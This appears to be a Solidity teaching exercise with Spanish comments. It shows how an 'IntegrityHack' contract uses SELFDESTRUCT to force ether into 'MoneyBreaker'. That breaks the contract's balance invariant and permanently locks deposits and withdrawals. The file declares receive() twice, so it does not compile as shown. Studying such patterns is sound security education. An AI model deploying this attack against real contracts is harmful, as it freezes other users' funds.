// SPDX-License-Identifier: MIT

pragma solidity >=0.8.15 <0.9.0;

// probar que falla con todo en los tests, pero que se le puede sacudir un selfdestruct
// primero parchearlo poniendo una fallback o receive que rechace lo que llegue.

contract MoneyBreaker {
    uint256 private balances;
    bool private locked;

    modifier hasIntegrity() {
        bool condition = address(this).balance == balances;
        require(condition, "Contract is locked. Something is wrong.");
        _;
    }

    function deposit() external payable hasIntegrity {
        balances += msg.value;
    }

    function withdraw(uint256 amount) external hasIntegrity {
        balances -= amount;
        payable(msg.sender).transfer(amount);
    }

    receive() payable external {}

    // # Step 1
    receive() payable external {
        revert();
    }

    // # Step 2
    fallback() payable external {
        revert();
    }
}

// # Step 3
contract IntegrityHack {
    address private immutable _target;

    constructor(address target) payable {
        require(msg.value > 0, "Send ether along please.");
        _target = target;
    }

    function kill() external {
        selfdestruct(payable(_target));
    }
}

/** Selfdestruct
  When the SELFDESTRUCT opcode is called, funds of the calling address are sent
  to the address on the stack, and execution is immediately halted. Since this
  opcode works on the EVM-level, Solidity-level functions that might block the
  receipt of Ether will not be executed.
*/
